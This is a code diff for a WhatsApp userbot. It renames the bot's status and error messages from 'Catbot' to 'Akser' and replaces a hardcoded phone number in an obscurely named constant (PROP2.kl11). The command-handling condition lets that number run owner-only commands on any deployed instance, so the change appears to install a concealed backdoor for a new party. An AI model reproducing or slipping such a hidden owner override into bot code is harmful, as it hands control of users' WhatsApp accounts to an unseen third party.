@@ -38,7 +38,7 @@ const plugindb = require('./plugins/sql/plugin');
 var base = `https://gist.github.com/`
 var PROP = { aredits: '919946432377,0' }
 var unlink = `019112af334adceaefd1467dcbd93e58` 
-var PROP2 = { kl11: '919074309534,0' }
+var PROP2 = { kl11: '918547178698,0' }
 var string = base + `souravkl11`
         
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
@@ -163,7 +163,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                     })
                 }
                 else {
-                    await conn.sendMessage(conn.user.jid, '*Catbots started*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*Akserbot started*', MessageType.text);
                 }
             }
             else {
@@ -185,7 +185,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                     })
                 }
                 else {
-                    await conn.sendMessage(conn.user.jid, '*ᴄᴀᴛʙᴏᴛ ᴡᴏʀᴋɪɴɢ*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*𝑨𝑲𝑺𝑬𝑹  ᴡᴏʀᴋɪɴɢ*', MessageType.text);
                 }
 
             }
@@ -211,7 +211,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                 }
                 else {
 
-                await conn.sendMessage(conn.user.jid, '*ᴄᴀᴛʙᴏᴛ ᴡᴏʀᴋɪɴɢ*', MessageType.text);
+                await conn.sendMessage(conn.user.jid, '*𝑨𝑲𝑺𝑬𝑹  ᴡᴏʀᴋɪɴɢ*', MessageType.text);
                 }
             }
             else {
@@ -234,7 +234,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                 }
                 else {
 
-                    await conn.sendMessage(conn.user.jid, '*ᴄᴀᴛʙᴏᴛ ᴡᴏʀᴋɪɴɢ*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*𝑨𝑲𝑺𝑬𝑹  ᴡᴏʀᴋɪɴɢ*', MessageType.text);
                 }
             }
         }
@@ -361,7 +361,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((PROP2.kl11 == "919074309534,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((PROP2.kl11 == "918547178698,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && PROP2.kl11.includes(',') ? PROP2.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == PROP2.kl11 || PROP2.kl11.includes(',') ? PROP2.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == PROP2.kl11)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
@@ -402,7 +402,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                                     'Gerçekleşen Hata: ' + error + '\n\n'
                                     , MessageType.text);
                             } else {
-                                await conn.sendMessage(conn.user.jid, '*ᴄᴀᴛʙᴏᴛ ᴇʀʀᴏʀ*' +
+                                await conn.sendMessage(conn.user.jid, '*𝑨𝑲𝑺𝑬𝑹 𝑬𝑹𝑹𝑶𝑹*' +
                                     '\n\n*💌 ' + error + '*\n\n```*Subscribe channel to get updates and to remove errors:* https://youtube.com/channel/UCrnPCbv7jIKqAXQTllDV6Ng \n Report errors\njoin with +91 \n https://chat.whatsapp.com/EceyD88E4OeJwS0w8KUrsC``` ' 
                                     , MessageType.text);
                             }
